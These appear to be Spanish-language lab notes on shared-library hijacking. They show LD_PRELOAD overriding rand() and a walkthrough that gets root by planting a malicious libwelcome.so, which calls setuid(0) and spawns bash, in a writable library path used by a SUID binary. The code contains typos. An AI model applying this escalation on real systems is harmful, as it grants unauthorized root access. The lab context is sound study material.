script en c para mostrarnos por consola un numero random
![[Pasted image 20260426182702.png]]

gcc random.c -o random

ldd random para ver librerias que utiliza por detras

uftrace herramienta

misc/install-
./configure
make
make install 

uftrace --force -a random

man 3 rand
parte del manula que queremos ver

nvim test.c

int rad(void){
return 42;
}

gcc -shared -fPIC test.c -o test
LD_PRELOAD=./test ./random
devuelve siempre 42

attack defense
library chaos
run

ls -l /usr/bin/welcome
welcome
ldd /usr/bin/welcome
ls -l /etc/ld.so.conf.d/
pwd
cd /etc/ld.so.conf.d/
cat custom.conf
mkdir lib
cd lib
vi test.c

\#include <stdio.h>
\#include <unitd.h>

int welcome(){
setuid(0);
setgid(0);
system("bash  -d");
return 0;
}

gcc -fPIC -shread test.c -o libwelcome.so
mv libwelcome /home/student/lib
welcome

sos root






